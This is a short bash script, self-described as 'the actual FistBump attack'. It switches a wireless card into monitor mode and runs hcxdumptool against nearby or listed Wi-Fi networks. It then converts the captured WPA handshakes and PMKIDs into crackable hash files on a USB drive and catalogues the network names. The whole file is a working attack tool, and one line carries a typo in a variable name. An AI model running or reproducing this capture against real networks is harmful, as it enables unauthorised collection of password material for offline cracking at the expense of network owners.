#!/bin/bash

# This script is the actual FistBump attack
# Called by arm_trigger.py

# 2018 - Erik Liddell Freely distributed under MIT license.

# VARIABLES
DATE=$(date +"%Y%m%d%H%M")
bootydir="/media/usb0"
TARGETSFILE=$bootydir"/targets.txt"
FILTER=""

if [ -e "/dev/sda" ]; then
        echo "flash drive attached"
	sudo mkdir $bootydir/Handshakes
	sudo mkdir $booydir/PMKID
	#number of handshakes existing
else 
        echo "Error: Booty drive not present"
        echo "Please insert a usb thumb dirve"
	# show red for 3 seconds
	exit
fi

# ---- set up interface
#kill wpa_supplicant
sudo killall wpa_supplicant

sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo rfkill unblock all
sudo ip link set wlan0 up

# ---- start attack
if [ -f "$TARGETSFILE" ]
then 
	echo "Targets Specified"
	FILTER="--filterlist=$TARGETSFILE --filtermode=2"
	echo "filter set"
	DATE="targeted-"$1
	echo "name set"
else
	echo "No targets specified"
fi

timeout -k 42 42 sudo hcxdumptool -i wlan0 $FILTER --enable_status=3 -o $DATE.pcapng &
PID=$!

sleep 40

sudo kill -TERM $PID

sudo hcxpcaptool -z $bootydir/PMKID/$DATE.16800 -o $bootydir/Handshakes/$DATE.2500 $DATE.pcapng
sudo rm $DATE.pcapng

# if  we have a handshake file lets make a catalog of essids in that file
if [ -f $bootydir/Handshakes/$DATE.2500 ]; then
	wlanhcxinfo -i $bootydir/Handshakes/$DATE.2500 -a -e > $bootydir/Handshakes/$DATE.catalog
fi

exit
